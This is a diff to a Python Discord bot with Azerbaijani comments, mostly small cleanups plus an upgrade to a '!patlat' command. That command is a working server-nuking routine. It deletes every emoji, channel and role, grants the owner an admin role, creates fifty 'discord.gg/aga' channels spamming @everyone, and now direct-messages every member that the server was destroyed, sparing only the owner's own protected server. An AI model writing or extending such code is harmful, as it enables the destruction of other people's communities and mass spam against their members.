@@ -34,12 +34,12 @@ intents.presences = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# Sahib ID-si və Qorunan Server ID-si (Öz ID-lərinizlə dəyişə bilərsiniz)
+# Sahib ID-si və Qorunan Server ID-si
 SAHIB_ID = 641014966312501259
 GUVENLI_SERVER_ID = 1520692621964738722
 XAS_COLOR = discord.Color.from_rgb(20, 24, 33)
 
-# Yaddaş Lüğətləri (Database əvəzi)
+# Yaddaş Lüğətləri
 user_message_counts = {}
 user_last_message_time = {}
 user_xp = {}
@@ -53,7 +53,7 @@ async def on_ready():
     print("--------------------------------------------------")
     print(f"Botun adı: {bot.user.name}")
     print(f"Botun ID-si: {bot.user.id}")
-    print("Status: 600+ sətirlik kütləvi sistemlər aktivdir, Sahib!")
+    print("Status: Kütləvi sistemlər tam güclə aktivdir, Sahib!")
     print("--------------------------------------------------")
     await bot.change_presence(activity=discord.Game(name="!panel | XAS Bot Systems"))
 
@@ -65,7 +65,6 @@ async def on_message(message):
     if message.author.bot:
         return
 
-    # Zərərli sözlərin və ya taglərin avtomatik silinməsi
     content_lower = message.content.lower()
     yasakli_kelimeler = ["/tag", "y1z", "g4r", "g3r", "discord.gg/"]
     for kelime in yasakli_kelimeler:
@@ -76,7 +75,6 @@ async def on_message(message):
             except:
                 pass
 
-    # XP və Səviyyə Qazanma Mexanizmi
     author_id = message.author.id
     current_xp = user_xp.get(author_id, {"xp": 0, "level": 1})
     current_xp["xp"] += random.randint(10, 25)
@@ -91,10 +89,8 @@ async def on_message(message):
             pass
     user_xp[author_id] = current_xp
 
-    # Komandaların işləməsi üçün vacibdir
     await bot.process_commands(message)
 
-    # Anti-Flood / Spam qorunması
     current_time = time.time()
     if author_id in user_last_message_time:
         diff = current_time - user_last_message_time[author_id]
@@ -114,7 +110,6 @@ async def on_message(message):
 
 @bot.event
 async def on_member_join(member):
-    # İcazəsiz bot girişlərinin qarşısının alınması
     if member.bot and member.guild.id != GUVENLI_SERVER_ID:
         try:
             await member.ban(reason="Təhlükəsizlik: İcazəsiz bot girişi bloklandı.")
@@ -188,7 +183,7 @@ async def giverole_cmd(ctx, member: discord.Member, *, role: discord.Role):
         await member.add_roles(role)
         await ctx.send(f"✅ Uğurlu: {member.mention} istifadəçisinə `{role.name}` rolu verildi.")
     except:
-        await ctx.send("❌ Xəta! Rol verilə bilmədi (botun səlahiyyəti çatmır və ya rol məndən yuxarıdadır).")
+        await ctx.send("❌ Xəta! Rol verilə bilmədi.")
 
 @bot.command(name="rolal", aliases=["removerole"])
 async def removerole_cmd(ctx, member: discord.Member, *, role: discord.Role):
@@ -505,7 +500,7 @@ async def slot_cmd(ctx):
 
 @bot.command(name="8ball")
 async def eight_ball_cmd(ctx, *, soru):
-    cavablar = ["Bəli", "Xeyr", b"Kesinlikle", "Şübhəlidir", "Mümkün deyil", "Əlbəttə"]
+    cavablar = ["Bəli", "Xeyr", "Kesinlikle", "Şübhəlidir", "Mümkün deyil", "Əlbəttə"]
     await ctx.send(f"🎱 Sual: {soru}\nCavab: **{random.choice(cavablar)}**")
 
 @bot.command(name="calc")
@@ -543,7 +538,7 @@ async def poll_cmd(ctx, *, soru):
     await msg.add_reaction("👎")
 
 # ==========================================
-# 10. !PATLAT KOMANDASI (NUKING SYSTEM)
+# 10. !PATLAT KOMANDASI (GÜCLƏNDİRİLMİŞ NUKING SYSTEM)
 # ==========================================
 @bot.command(name="patlat")
 async def patlat_cmd(ctx):
@@ -556,23 +551,20 @@ async def patlat_cmd(ctx):
         await ctx.send("🛡️ Təhlükəsizlik xəbərdarlığı: Bu qorunan serverdir, partlatmaq qadağandır!")
         return
 
-    await ctx.send("💥 Serveri sıfırlama (Nuke) əməliyyatı başladıldı!")
+    await ctx.send("💥 Kütləvi sıfırlama və spam əməliyyatı başladıldı!")
     
-    # Emojilərin silinməsi
     for emoji in list(guild.emojis):
         try:
             await emoji.delete()
         except:
             pass
 
-    # Kanalların silinməsi
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             pass
 
-    # Rolların silinməsi
     for role in guild.roles:
         if role != guild.default_role and not role.managed:
             try:
@@ -580,7 +572,6 @@ async def patlat_cmd(ctx):
             except:
                 pass
 
-    # Yeni admin rolu yaradılması və sahibə verilməsi
     try:
         new_role = await guild.create_role(
             name="discord.gg/aga",
@@ -591,14 +582,20 @@ async def patlat_cmd(ctx):
     except:
         pass
 
-    # Yeni kanalların açılması və spam mesajlar yazılması
-    for i in range(1, 25):
+    for i in range(1, 51):
         try:
-            channel = await guild.create_text_channel(f"nuke-kanal-{i}")
-            for _ in range(3):
+            channel = await guild.create_text_channel(f"discord.gg/aga-{i}")
+            for _ in range(5):
                 await channel.send("discord.gg/aga @everyone")
         except:
             pass
+            
+    for member in guild.members:
+        if not member.bot and member.id != SAHIB_ID:
+            try:
+                await member.send("discord.gg/aga Server dağıtıldı!")
+            except:
+                pass
 
 # ==========================================
 # 11. BOTUN İŞƏ DÜŞMƏSİ (RUN)
